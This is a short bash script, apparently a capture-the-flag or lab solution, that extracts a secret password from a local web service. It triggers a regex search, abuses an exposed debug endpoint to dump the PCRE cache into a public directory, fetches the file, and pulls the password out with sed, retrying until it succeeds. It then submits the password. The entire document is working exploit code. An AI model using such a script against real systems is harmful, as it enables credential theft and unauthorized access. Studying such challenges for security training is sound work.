#!/usr/bin/env bash
while true; do
  # Request 1: pass empty password to trigger a regex search (fills the cache)
  curl 127.0.0.1?password= &>/dev/null
  # Request 2: dump the cache somewhere accessible
  curl 127.0.0.1:9001/dump-pcre-cache?file=/var/www/public/test.gif &>/dev/null
  # Request 3: fetch the cache
  out="$(curl 127.0.0.1/test.gif 2>/dev/null | sed -En 's:/\^\(([0-9a-z]+)\).*:\1:p')"
  if [ $(echo "$out" | wc -l) == 1 ]; then
    break
  fi
  # /var/www/public directory is purged every 3 seconds. We have a retry
  # mechanism in case the purge is triggered between request 1 and 3.
done
echo "Password is $out"
# Request 4: pass the password
curl "127.0.0.1?password=$out"
